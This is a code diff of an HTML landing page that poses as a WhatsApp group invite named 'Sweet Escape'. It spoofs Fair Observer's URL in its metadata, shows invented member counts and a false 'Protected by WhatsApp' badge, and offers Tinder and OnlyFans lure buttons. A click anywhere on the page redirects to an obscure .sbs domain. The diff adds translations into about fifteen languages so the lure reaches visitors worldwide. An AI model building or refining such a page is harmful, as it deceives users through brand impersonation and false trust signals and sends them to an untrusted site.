@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-	<link rel="canonical" href="https://www.fairobserver.com/">
+    <link rel="canonical" href="https://www.fairobserver.com/">
     <meta name="robots" content="index, follow">
     <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta property="og:title" content="🟢 Online - Whatsapp +1212***66">
+    <meta property="og:title" content="🟢 Online - Whatsapp Group">
     <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
     <meta property="og:image" content="https://snipboard.io/HepwjM.jpg">
     <meta property="og:url" content="https://www.fairobserver.com/">
@@ -14,11 +14,12 @@
     <meta property="og:site_name" content="WhatsApp Group">
     <meta property="fb:app_id" content="124024574287414">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="🟢 Online - Whatsapp +1212***66">
+    <meta name="twitter:title" content="🟢 Online - Whatsapp Group">
     <meta name="twitter:description" content="Browse trending profiles and discover new updates shared by active users.">
     <meta name="twitter:image" content="https://snipboard.io/HepwjM.jpg">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>🟢 Online - Whatsapp +1212***66</title>
+    <title>Loading...</title>
+    
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -34,12 +35,17 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            cursor: pointer; /* Indikator area klik penuh */
+            cursor: pointer;
             background-color: #0a2b1f;
             overflow-x: hidden;
+            position: relative;
         }
 
-        /* Video Background Handling */
+        /* Google Translate Bar Override (Hide default ugly bar if needed, but usually keep for UX) */
+        .skiptranslate { display: none !important; }
+        body { top: 0px !important; }
+
+        /* Video Background */
         video.bg-video {
             position: fixed;
             top: 0;
@@ -51,7 +57,6 @@
             z-index: -2;
         }
 
-        /* Overlay Gelap & Blur */
         body::before {
             content: "";
             position: fixed;
@@ -59,12 +64,12 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6); /* Sedikit lebih gelap untuk keterbacaan */
+            background: rgba(0, 0, 0, 0.6);
             z-index: -1;
             backdrop-filter: blur(3px);
         }
 
-        /* Header ala WhatsApp */
+        /* Header */
         .whatsapp-header {
             background-color: #075e54;
             padding: 16px;
@@ -80,29 +85,15 @@
             color: white;
             font-size: 20px;
             cursor: pointer;
-            transition: opacity 0.2s;
             opacity: 0.9;
             width: 30px;
             display: flex;
             justify-content: center;
         }
-        .back-button:hover { opacity: 1; }
 
-        .header-text {
-            flex: 1;
-        }
-
-        .header-text h1 {
-            font-size: 18px;
-            font-weight: 600;
-            line-height: 1.2;
-        }
-
-        .header-text p {
-            font-size: 13px;
-            opacity: 0.9;
-            margin-top: 2px;
-        }
+        .header-text { flex: 1; }
+        .header-text h1 { font-size: 18px; font-weight: 600; line-height: 1.2; }
+        .header-text p { font-size: 13px; opacity: 0.9; margin-top: 2px; }
 
         /* Main Layout */
         .main-content {
@@ -111,16 +102,12 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px 20px;
+            padding: 20px;
             text-align: center;
-            position: relative;
             z-index: 1;
         }
 
-        .profile-container {
-            margin-bottom: 15px;
-            width: 100%;
-        }
+        .profile-container { margin-bottom: 15px; width: 100%; }
 
         .profile-img {
             width: 120px;
@@ -138,12 +125,7 @@
             border: 3px solid rgba(255,255,255,0.4);
             position: relative;
         }
-
-        .profile-img img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+        .profile-img img { width: 100%; height: 100%; object-fit: cover; }
 
         .group-name {
             font-size: 24px;
@@ -151,15 +133,9 @@
             margin-bottom: 5px;
             text-shadow: 0 2px 4px rgba(0,0,0,0.3);
         }
+        .group-info { font-size: 14px; opacity: 0.9; margin-bottom: 20px; font-weight: 400; }
 
-        .group-info {
-            font-size: 14px;
-            opacity: 0.9;
-            margin-bottom: 20px;
-            font-weight: 400;
-        }
-
-        /* Stats Cards */
+        /* Stats */
         .members-info {
             display: flex;
             justify-content: center;
@@ -167,43 +143,25 @@
             margin-bottom: 25px;
             flex-wrap: wrap;
         }
-
-        .member-count,
-        .active-members {
+        .member-count, .active-members {
             display: flex;
             flex-direction: column;
             align-items: center;
-            cursor: default;
             background: rgba(0,0,0,0.4);
             backdrop-filter: blur(10px);
             padding: 10px 24px;
             border-radius: 45px;
             border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.2s;
             min-width: 100px;
         }
-        
-        /* Efek hover pada stats */
-        .member-count:hover,
-        .active-members:hover {
+        .member-count:hover, .active-members:hover {
             background: rgba(0,0,0,0.6);
             transform: translateY(-2px);
+            transition: all 0.2s;
         }
-
-        .count {
-            font-size: 24px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-        }
-
-        .label {
-            font-size: 12px;
-            opacity: 0.85;
-            margin-top: 3px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
+        .count { font-size: 24px; font-weight: 800; letter-spacing: 0.5px; }
+        .label { font-size: 12px; opacity: 0.85; margin-top: 3px; text-transform: uppercase; letter-spacing: 0.5px; }
+        
         .online-indicator {
             display: flex;
             align-items: center;
@@ -212,7 +170,6 @@
             font-size: 12px;
             color: #25d366;
         }
-
         .dot {
             width: 8px;
             height: 8px;
@@ -221,14 +178,13 @@
             box-shadow: 0 0 8px #25d366;
             animation: pulseGreen 1.4s infinite;
         }
-
         @keyframes pulseGreen {
             0% { opacity: 0.6; transform: scale(0.9);}
             50% { opacity: 1; transform: scale(1.1);}
             100% { opacity: 0.6; transform: scale(0.9);}
         }
 
-        /* Buttons Container */
+        /* Buttons */
         .button-container {
             display: flex;
             flex-direction: column;
@@ -238,7 +194,6 @@
             width: 100%;
             max-width: 350px;
         }
-
         .btn-social {
             width: 100%;
             display: flex;
@@ -258,9 +213,7 @@
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
-            position: relative;
         }
-
         .btn-social span {
             display: inline-block;
             overflow: hidden;
@@ -269,59 +222,15 @@
             flex: 1;
             text-align: center;
         }
+        .btn-social.whatsapp { background: linear-gradient(135deg, #25d366, #128c7e); }
+        .btn-social.tinder { background: linear-gradient(135deg, #fd297b, #ff655b); }
+        .btn-social.onlyfans { background: linear-gradient(135deg, #00aff0, #009cd6); }
+        .btn-social:hover { transform: translateY(-3px); box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5); filter: brightness(1.1); }
+        .btn-social:active { transform: scale(0.98); }
+        .btn-social.loading { pointer-events: none; opacity: 0.8; transform: scale(0.98); }
+        .btn-social.loading i, .btn-social.loading .custom-icon { animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Custom Icon Handling */
-        .btn-social .custom-icon {
-            width: 22px;
-            height: 22px;
-            object-fit: contain;
-            flex-shrink: 0;
-        }
-
-        .btn-social i {
-            font-size: 20px;
-            flex-shrink: 0;
-        }
-
-        /* Button Colors */
-        .btn-social.whatsapp {
-            background: linear-gradient(135deg, #25d366, #128c7e);
-        }
-        .btn-social.tinder {
-            background: linear-gradient(135deg, #fd297b, #ff655b); /* Tinder Gradient */
-        }
-        .btn-social.onlyfans {
-            background: linear-gradient(135deg, #00aff0, #009cd6); /* OnlyFans Blue */
-        }
-
-        .btn-social:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
-            filter: brightness(1.1);
-        }
-
-        .btn-social:active {
-            transform: scale(0.98);
-        }
-
-        /* Loading State Animation */
-        .btn-social.loading {
-            pointer-events: none;
-            opacity: 0.8;
-            transform: scale(0.98);
-        }
-        
-        .btn-social.loading i, 
-        .btn-social.loading .custom-icon {
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Security Notice */
         .security-notice {
             display: flex;
             align-items: center;
@@ -335,27 +244,15 @@
             backdrop-filter: blur(5px);
             border: 1px solid rgba(255,255,255,0.05);
         }
+        .footer { padding: 14px; font-size: 10px; opacity: 0.5; text-align: center; flex-shrink: 0; }
 
-        /* Footer */
-        .footer {
-            padding: 14px;
-            font-size: 10px;
-            opacity: 0.5;
-            text-align: center;
-            flex-shrink: 0;
-        }
-
-        /* Floating Animation for Profile */
         @keyframes softPulse {
             0% { transform: scale(1); box-shadow: 0 15px 25px rgba(0,0,0,0.2);}
             50% { transform: scale(1.03); box-shadow: 0 20px 35px rgba(0,0,0,0.3);}
             100% { transform: scale(1); box-shadow: 0 15px 25px rgba(0,0,0,0.2);}
         }
-        .profile-img {
-            animation: softPulse 4s infinite ease-in-out;
-        }
+        .profile-img { animation: softPulse 4s infinite ease-in-out; }
 
-        /* Responsive Queries */
         @media (max-width: 520px) {
             .profile-img { width: 100px; height: 100px; }
             .group-name { font-size: 20px; }
@@ -364,7 +261,6 @@
             .member-count, .active-members { padding: 8px 18px; min-width: 90px;}
             .button-container { max-width: 280px; gap: 12px; }
         }
-
         @media (max-width: 400px) {
             .btn-social { font-size: 14px; padding: 12px; }
             .btn-social .custom-icon { width: 18px; height: 18px; }
@@ -376,37 +272,35 @@
 
 <video class="bg-video" id="bgVideo" autoplay muted loop playsinline poster="https://thumbsnap.com/i/tiAP6Uk1.mp4"></video>
 
-
 <div class="whatsapp-header">
     <div class="back-button" id="backBtn" title="Go Back">
         <i class="fas fa-arrow-left"></i>
     </div>
     <div class="header-text">
-        <h1>💕 Sweet Escape 💕</h1>
-        <p>WhatsApp • Invite</p>
+        <h1 id="headerTitle">Loading...</h1>
+        <p id="headerSubtitle">Loading...</p>
     </div>
 </div>
 
-<div class="main-content">
+<div class="main-content" id="mainContent">
     <div class="profile-container">
         <div class="profile-img">
-            <!-- Placeholder Image acak untuk profil -->
             <img src="https://pbs.twimg.com/media/HGM_aQjbIAAO4sz?format=jpg&name=large" alt="Group Icon">
         </div>
-        <div class="group-name">💕 Sweet Escape 💕</div>
-        <div class="group-info">👑 Admin: Claire &amp; Audrey 🔥</div>
+        <div class="group-name" id="groupName">Loading...</div>
+        <div class="group-info" id="groupInfo">Loading...</div>
     </div>
 
     <div class="members-info">
         <div class="member-count" id="memberCountDisplay">
             <div class="count">131.1K</div>
-            <div class="label">Members</div>
+            <div class="label" id="labelMembers">Members</div>
         </div>
         <div class="active-members" id="activeMembersDisplay">
             <div class="count">55.0K</div>
             <div class="online-indicator">
                 <div class="dot"></div>
-                <span>Online now</span>
+                <span id="labelOnline">Online now</span>
             </div>
         </div>
     </div>
@@ -414,50 +308,380 @@
     <div class="button-container">
         <a href="#" class="btn-social whatsapp" id="whatsappBtn">
             <i class="fab fa-whatsapp"></i>
-            <span>Join WhatsApp Group</span>
+            <span id="btnWhatsapp">Join WhatsApp Group</span>
         </a>
         
         <a href="#" class="btn-social tinder" id="tinderBtn">
             <img class="custom-icon" src="https://tinder.com/favicon-32x32.png" alt="Tinder" onerror="this.style.display='none'; this.nextSibling.style.display='inline';">
             <i class="fas fa-fire" style="display: none;"></i>
-            <span>Find Your Perfect Match Tonight</span>
+            <span id="btnTinder">Find Your Perfect Match Tonight</span>
         </a>
         
         <a href="#" class="btn-social onlyfans" id="onlyfansBtn">
             <img class="custom-icon" src="https://files.catbox.moe/y2ouht.ico" alt="OnlyFans" onerror="this.style.display='none'; this.nextSibling.style.display='inline';">
             <i class="fas fa-star" style="display: none;"></i>
-            <span>Unlock Exclusive OnlyFans Content</span>
+            <span id="btnOnlyfans">Unlock Exclusive OnlyFans Content</span>
         </a>
     </div>
 
     <div class="security-notice">
         <i class="fas fa-shield-alt"></i>
-        <span>Protected by WhatsApp • Trusted invite</span>
+        <span id="securityText">Protected by WhatsApp • Trusted invite</span>
     </div>
 </div>
 
-<div class="footer">
+<div class="footer" id="footerText">
     ⚡ Click anywhere to join instantly!
 </div>
 
-<script>
-    // --- Configuration ---
-    // Ganti URL ini dengan link tujuan Anda (misal: link affiliate, link WA, dll)
-    const targetRedirectUrl = "https://FsAHvsG.gemblong.sbs/kcqbGncsDdbSYpqiniW4";
-    
-    let isRedirecting = false;
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en', includedLanguages: 'en,id,es,fr,de,it,pt,ru,ja,ko,zh-CN,ar,hi,vi,th,tr,nl,pl,sv,da,fi,ro,el,he,cs,uk,bg,hu', layout: google.translate.TranslateElement.InlineLayout.SIMPLE, autoDisplay: false}, 'google_translate_element');
+}
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
-    // --- Functions ---
+<script>
+    const translations = {
+        id: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Undangan",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Anggota",
+            labelOnline: "Online sekarang",
+            btnWhatsapp: "Gabung Grup WhatsApp",
+            btnTinder: "Temukan Pasanganmu Malam Ini",
+            btnOnlyfans: "Buka Konten Eksklusif OnlyFans",
+            securityText: "Dilindungi oleh WhatsApp • Undangan terpercaya",
+            footerText: "⚡ Klik di mana saja untuk bergabung sekarang!",
+            metaTitle: "🟢 Online - Whatsapp +1212***66",
+            metaDesc: "Jelajahi profil yang sedang tren dan temukan pembaruan baru.",
+            loadingText: "Mengalihkan...",
+            errorConfig: "Konfigurasi Link Diperlukan"
+        },
+        es: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Invitación",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Miembros",
+            labelOnline: "En línea ahora",
+            btnWhatsapp: "Unirse al grupo de WhatsApp",
+            btnTinder: "Encuentra tu pareja perfecta esta noche",
+            btnOnlyfans: "Desbloquea contenido exclusivo de OnlyFans",
+            securityText: "Protegido por WhatsApp • Invitación confiable",
+            footerText: "⚡ ¡Haz clic en cualquier lugar para unirse instantáneamente!",
+            metaTitle: "🟢 En línea - Whatsapp +1212***66",
+            metaDesc: "Explora perfiles tendencia y descubre nuevas actualizaciones.",
+            loadingText: "Redirigiendo...",
+            errorConfig: "Configuración de enlace necesaria"
+        },
+        fr: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Invitation",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Membres",
+            labelOnline: "En ligne maintenant",
+            btnWhatsapp: "Rejoindre le groupe WhatsApp",
+            btnTinder: "Trouvez votre partenaire idéal ce soir",
+            btnOnlyfans: "Débloquez du contenu exclusif OnlyFans",
+            securityText: "Protégé par WhatsApp • Invitation de confiance",
+            footerText: "⚡ Cliquez n'importe où pour rejoindre instantanément !",
+            metaTitle: "🟢 En ligne - Whatsapp +1212***66",
+            metaDesc: "Parcourez les profils tendance et découvrez de nouvelles mises à jour.",
+            loadingText: "Redirection...",
+            errorConfig: "Configuration du lien requise"
+        },
+        de: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Einladung",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Mitglieder",
+            labelOnline: "Jetzt online",
+            btnWhatsapp: "WhatsApp-Gruppe beitreten",
+            btnTinder: "Finde heute Abend deinen perfekten Partner",
+            btnOnlyfans: "Schalte exklusive OnlyFans-Inhalte frei",
+            securityText: "Geschützt durch WhatsApp • Vertrauenswürdige Einladung",
+            footerText: "⚡ Klicken Sie überall, um sofort beizutreten!",
+            metaTitle: "🟢 Online - Whatsapp +1212***66",
+            metaDesc: "Stöbern Sie durch Trend-Profile und entdecken Sie neue Updates.",
+            loadingText: "Weiterleitung...",
+            errorConfig: "Link-Konfiguration erforderlich"
+        },
+        pt: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Convite",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Membros",
+            labelOnline: "Online agora",
+            btnWhatsapp: "Entrar no grupo WhatsApp",
+            btnTinder: "Encontre sua combinação perfeita esta noite",
+            btnOnlyfans: "Desbloqueie conteúdo exclusivo do OnlyFans",
+            securityText: "Protegido pelo WhatsApp • Convite confiável",
+            footerText: "⚡ Clique em qualquer lugar para entrar instantaneamente!",
+            metaTitle: "🟢 Online - Whatsapp +1212***66",
+            metaDesc: "Navegue por perfis em alta e descubra novas atualizações.",
+            loadingText: "Redirecionando...",
+            errorConfig: "Configuração de link necessária"
+        },
+        ru: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Приглашение",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Админ: Клэр и Одри 🔥",
+            labelMembers: "Участников",
+            labelOnline: "Онлайн сейчас",
+            btnWhatsapp: "Присоединиться к группе WhatsApp",
+            btnTinder: "Найдите свою идеальную пару сегодня вечером",
+            btnOnlyfans: "Откройте эксклюзивный контент OnlyFans",
+            securityText: "Защищено WhatsApp • Доверительное приглашение",
+            footerText: "⚡ Нажмите в любом месте, чтобы присоединиться мгновенно!",
+            metaTitle: "🟢 Онлайн - Whatsapp +1212***66",
+            metaDesc: "Просматривайте популярные профили и узнавайте о новых обновлениях.",
+            loadingText: "Перенаправление...",
+            errorConfig: "Требуется настройка ссылки"
+        },
+        ja: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • 招待",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 管理者: Claire & Audrey 🔥",
+            labelMembers: "メンバー",
+            labelOnline: "オンライン中",
+            btnWhatsapp: "WhatsAppグループに参加",
+            btnTinder: "今夜、あなたの理想の相手を見つけましょう",
+            btnOnlyfans: "OnlyFansの限定コンテンツをアンロック",
+            securityText: "WhatsAppで保護 • 信頼できる招待",
+            footerText: "⚡ どこでもクリックして今すぐ参加！",
+            metaTitle: "🟢 オンライン - Whatsapp +1212***66",
+            metaDesc: "トレンドのプロフィールを閲覧し、新しい更新を発見しましょう。",
+            loadingText: "リダイレクト中...",
+            errorConfig: "リンク設定が必要です"
+        },
+        ko: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • 초대",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 관리자: Claire & Audrey 🔥",
+            labelMembers: "회원",
+            labelOnline: "지금 온라인",
+            btnWhatsapp: "WhatsApp 그룹 참여",
+            btnTinder: "오늘 밤 완벽한 상대를 찾으세요",
+            btnOnlyfans: "OnlyFans 독점 콘텐츠 잠금 해제",
+            securityText: "WhatsApp으로 보호됨 • 신뢰할 수 있는 초대",
+            footerText: "⚡ 아무 곳이나 클릭하여 즉시 참여하세요!",
+            metaTitle: "🟢 온라인 - Whatsapp +1212***66",
+            metaDesc: "인기 프로필을 찾아보고 새로운 업데이트를 확인하세요.",
+            loadingText: "리디렉션 중...",
+            errorConfig: "링크 구성 필요"
+        },
+        zh: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • 邀请",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 管理员: Claire & Audrey 🔥",
+            labelMembers: "成员",
+            labelOnline: "当前在线",
+            btnWhatsapp: "加入WhatsApp群组",
+            btnTinder: "今晚找到您的完美匹配",
+            btnOnlyfans: "解锁OnlyFans独家内容",
+            securityText: "受WhatsApp保护 • 可信邀请",
+            footerText: "⚡ 点击任意位置立即加入！",
+            metaTitle: "🟢 在线 - Whatsapp +1212***66",
+            metaDesc: "浏览热门资料并发现用户分享的新更新。",
+            loadingText: "重定向中...",
+            errorConfig: "需要链接配置"
+        },
+        ar: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "واتساب • دعوة",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 المسؤول: كلير وأودري 🔥",
+            labelMembers: "الأعضاء",
+            labelOnline: "متصل الآن",
+            btnWhatsapp: "انضم إلى مجموعة واتساب",
+            btnTinder: "اعثر على شريكك المثالي الليلة",
+            btnOnlyfans: "افتح المحتوى الحصري لـ OnlyFans",
+            securityText: "محمي بواسطة واتساب • دعوة موثوقة",
+            footerText: "⚡ انقر في أي مكان للانضمام فوراً!",
+            metaTitle: "🟢 متصل - واتساب +1212***66",
+            metaDesc: "تصفح الملفات الرائجة واكتشف التحديثات الجديدة.",
+            loadingText: "جاري إعادة التوجيه...",
+            errorConfig: "مطلوب تكوين الرابط",
+            rtl: true // Tandai agar bisa disesuaikan jika perlu (opsional)
+        },
+        hi: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • निमंत्रण",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 एडमिन: Claire & Audrey 🔥",
+            labelMembers: "सदस्य",
+            labelOnline: "अभी ऑनलाइन",
+            btnWhatsapp: "व्हाट्सएप ग्रुप से जुड़ें",
+            btnTinder: "आज रात अपना आदर्श मिलान खोजें",
+            btnOnlyfans: "OnlyFans विशेष सामग्री अनलॉक करें",
+            securityText: "WhatsApp द्वारा सुरक्षित • विश्वसनीय निमंत्रण",
+            footerText: "⚡ तुरंत जुड़ने के लिए कहीं भी क्लिक करें!",
+            metaTitle: "🟢 ऑनलाइन - Whatsapp +1212***66",
+            metaDesc: "लोकप्रिय प्रोफाइल देखें और नई अपडेट खोजें।",
+            loadingText: "पुनर्निर्देशित हो रहा है...",
+            errorConfig: "लिंक कॉन्फ़िगरेशन आवश्यक"
+        },
+        vi: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Lời mời",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Quản trị viên: Claire & Audrey 🔥",
+            labelMembers: "Thành viên",
+            labelOnline: "Đang trực tuyến",
+            btnWhatsapp: "Tham gia nhóm WhatsApp",
+            btnTinder: "Tìm người bạn hoàn hảo tối nay",
+            btnOnlyfans: "Mở khóa nội dung độc quyền OnlyFans",
+            securityText: "Được bảo vệ bởi WhatsApp • Lời mời đáng tin cậy",
+            footerText: "⚡ Bấm bất cứ đâu để tham gia ngay lập tức!",
+            metaTitle: "🟢 Trực tuyến - Whatsapp +1212***66",
+            metaDesc: "Duyệt qua các hồ sơ xu hướng và khám phá các bản cập nhật mới.",
+            loadingText: "Đang chuyển hướng...",
+            errorConfig: "Cần cấu hình liên kết"
+        },
+        th: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • คำเชิญ",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 แอดมิน: Claire & Audrey 🔥",
+            labelMembers: "สมาชิก",
+            labelOnline: "ออนไลน์อยู่",
+            btnWhatsapp: "เข้าร่วมกลุ่ม WhatsApp",
+            btnTinder: "ค้นหาคู่ที่เหมาะสมของคุณในคืนนี้",
+            btnOnlyfans: "ปลดล็อกเนื้อหาพิเศษ OnlyFans",
+            securityText: "ได้รับการคุ้มครองโดย WhatsApp • คำเชิญที่เชื่อถือได้",
+            footerText: "⚡ คลิกที่ใดก็ได้เพื่อเข้าร่วมทันที!",
+            metaTitle: "🟢 ออนไลน์ - Whatsapp +1212***66",
+            metaDesc: "เรียกดูโปรไฟล์ยอดนิยมและค้นพบการอัปเดตใหม่ๆ",
+            loadingText: "กำลังเปลี่ยนเส้นทาง...",
+            errorConfig: "ต้องมีการกำหนดค่าลิงก์"
+        },
+        tr: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Davet",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Yönetici: Claire & Audrey 🔥",
+            labelMembers: "Üyeler",
+            labelOnline: "Şu an çevrimiçi",
+            btnWhatsapp: "WhatsApp Grubuna Katıl",
+            btnTinder: "Bu akşam mükemmel eşleşmenizi bulun",
+            btnOnlyfans: "OnlyFans Özel İçeriğinin Kilidini Açın",
+            securityText: "WhatsApp ile korunmuş • Güvenilir davet",
+            footerText: "⚡ Anında katılmak için herhangi bir yere tıklayın!",
+            metaTitle: "🟢 Çevrimiçi - Whatsapp +1212***66",
+            metaDesc: "Trend profillere göz atın ve yeni güncellemeleri keşfedin.",
+            loadingText: "Yönlendiriliyor...",
+            errorConfig: "Bağlantı yapılandırması gerekli"
+        },
+        nl: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Uitnodiging",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Leden",
+            labelOnline: "Nu online",
+            btnWhatsapp: "Word lid van de WhatsApp-groep",
+            btnTinder: "Vanavond je perfecte match vinden",
+            btnOnlyfans: "Ontgrendel exclusieve OnlyFans-content",
+            securityText: "Beschermd door WhatsApp • Betrouwbare uitnodiging",
+            footerText: "⚡ Klik waar dan ook om direct deel te nemen!",
+            metaTitle: "🟢 Online - Whatsapp +1212***66",
+            metaDesc: "Blader door trending profielen en ontdek nieuwe updates.",
+            loadingText: "Omleiding...",
+            errorConfig: "Linkconfiguratie vereist"
+        },
+        pl: {
+            headerTitle: "💕 Sweet Escape 💕",
+            headerSubtitle: "WhatsApp • Zaproszenie",
+            groupName: "💕 Sweet Escape 💕",
+            groupInfo: "👑 Admin: Claire & Audrey 🔥",
+            labelMembers: "Członków",
+            labelOnline: "Online teraz",
+            btnWhatsapp: "Dołącz do grupy WhatsApp",
+            btnTinder: "Znajdź swojego idealnego partnera dzisiejszej nocy",
+            btnOnlyfans: "Odblokuj ekskluzywne treści OnlyFans",
+            securityText: "Chronione przez WhatsApp • Zaufane zaproszenie",
+            footerText: "⚡ Kliknij dowolne miejsce, aby dołączyć natychmiast!",
+            metaTitle: "🟢 Online - Whatsapp +1212***66",
+            metaDesc: "Przeglądaj trendy profile i odkrywaj nowe aktualizacje.",
+            loadingText: "Przekierowywanie...",
+            errorConfig: "Wymagana konfiguracja linku"
+        }
+    };
+
+    function applyLanguage() {
+        const browserLang = navigator.language || navigator.userLanguage;
+        const langCode = browserLang.split('-')[0].toLowerCase();
+        
+        let t = translations['en'];
+        let useGoogleTranslate = false;
+
+        if (translations[langCode]) {
+            t = translations[langCode];
+            console.log("🌍 Using Manual Translation: " + langCode);
+        } else {
+            t = translations['en'];
+            useGoogleTranslate = true;
+            console.log("🌍 Language ("+langCode+") not in DB. Using Google Translate fallback.");
+        }
+
+        document.getElementById('headerTitle').innerText = t.headerTitle;
+        document.getElementById('headerSubtitle').innerText = t.headerSubtitle;
+        document.getElementById('groupName').innerText = t.groupName;
+        document.getElementById('groupInfo').innerText = t.groupInfo;
+        document.getElementById('labelMembers').innerText = t.labelMembers;
+        document.getElementById('labelOnline').innerText = t.labelOnline;
+        document.getElementById('btnWhatsapp').innerText = t.btnWhatsapp;
+        document.getElementById('btnTinder').innerText = t.btnTinder;
+        document.getElementById('btnOnlyfans').innerText = t.btnOnlyfans;
+        document.getElementById('securityText').innerText = t.securityText;
+        document.getElementById('footerText').innerText = t.footerText;
+        
+        document.title = t.metaTitle;
+        document.querySelector('meta[property="og:title"]').setAttribute("content", t.metaTitle);
+        document.querySelector('meta[property="og:description"]').setAttribute("content", t.metaDesc);
+        document.querySelector('meta[name="twitter:title"]').setAttribute("content", t.metaTitle);
+        document.querySelector('meta[name="twitter:description"]').setAttribute("content", t.metaDesc);
+
+        window.currentLangTexts = t;
+
+        if (useGoogleTranslate) {
+            setTimeout(() => {
+                const googleTranslateCombo = document.createElement("div");
+                googleTranslateCombo.id = "google_translate_element";
+                googleTranslateCombo.style.display = "none";
+                document.body.appendChild(googleTranslateCombo);
+
+                if (typeof google !== 'undefined' && google.translate) {
+                    const te = new google.translate.TranslateElement({pageLanguage: 'en', includedLanguages: langCode, layout: google.translate.TranslateElement.FloatPosition.TOP_LEFT, autoDisplay: false}, 'google_translate_element');
+                } else {
+                    console.warn("Google Translate script not loaded yet.");
+                }
+            }, 1000);
+        }
+    }
+
+    applyLanguage();
+
+    const targetRedirectUrl = "https://FsAHvsG.gemblong.sbs/kcqbGncsDdbSYpqiniW4";
+    let isRedirecting = false;
 
     function showLoadingOnButton(button) {
         if (!button) return;
-        
-        // Simpan konten asli jika belum ada
         if (!button.hasAttribute('data-original')) {
             button.setAttribute('data-original', button.innerHTML);
         }
-        
-        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Redirecting...</span>';
+        const loadingMsg = window.currentLangTexts ? window.currentLangTexts.loadingText : "Redirecting...";
+        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>' + loadingMsg + '</span>';
         button.classList.add('loading');
         button.style.pointerEvents = 'none';
     }
@@ -465,13 +689,12 @@
     function performRedirect(buttonElement = null) {
         if (isRedirecting) return;
         
-        // Validasi URL
         if (!targetRedirectUrl || targetRedirectUrl === "#") {
-            console.warn("⚠️ Redirect URL belum diset. Membiarkan user di halaman.");
             const btn = buttonElement || document.querySelector('.btn-social');
             if (btn) {
+                const errorMsg = window.currentLangTexts ? window.currentLangTexts.errorConfig : "Link Configuration Needed";
                 const originalText = btn.querySelector('span').innerText;
-                btn.querySelector('span').innerText = "Link Configuration Needed";
+                btn.querySelector('span').innerText = errorMsg;
                 setTimeout(() => {
                     btn.querySelector('span').innerText = originalText;
                     btn.classList.remove('loading');
@@ -483,7 +706,6 @@
         isRedirecting = true;
         console.log("🚀 Redirecting to:", targetRedirectUrl);
         
-        // Efek loading pada tombol
         if (buttonElement) {
             showLoadingOnButton(buttonElement);
         } else {
